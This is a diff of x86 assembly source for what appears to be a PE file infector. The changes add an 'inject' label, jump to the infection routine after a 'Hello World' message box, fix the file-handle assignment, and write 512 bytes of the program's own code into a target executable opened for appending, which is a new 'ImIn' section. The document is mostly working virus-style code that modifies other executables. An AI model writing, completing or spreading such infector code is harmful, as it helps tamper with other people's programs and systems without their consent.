@@ -42,6 +42,8 @@ NewSectionName	db	"ImIn",0
 
 .code
 
+inject:
+
 sGetProcAddress	db	'GetProcAddress', 0 
 sMessageBoxA	db	'MessageBoxA', 0 
 sLoadLibrary	db	'LoadLibraryA', 0 
@@ -115,6 +117,8 @@ push	offset sHelloWorld
 push	0
 call	eax
 
+jmp	begin
+
 ; EXIT TEST
 push	0
 call 	ExitProcess
@@ -143,6 +147,7 @@ dw	042h
 
 
 
+begin:
 
 ; OPEN FILE
 push	0
@@ -353,17 +358,19 @@ push	FILE_SHARE_READ
 push	FILE_APPEND_DATA
 push	offset FileName
 call	CreateFile
-mov	eax, PeFile
+mov	PeFile, eax
+call	CheckError
 
 ; INSERT OPCODE
 mov	ecx, 512 ; endToInject - toInject ; Number of bytes
-mov	esi, toInject ; Source bytes
+mov	esi, inject ; Source bytes
 push	0
 push	0
 push	ecx
 push	esi
 push	PeFile
 call	WriteFile
+call	CheckError
 
 ; CLOSE
 push	PeFile
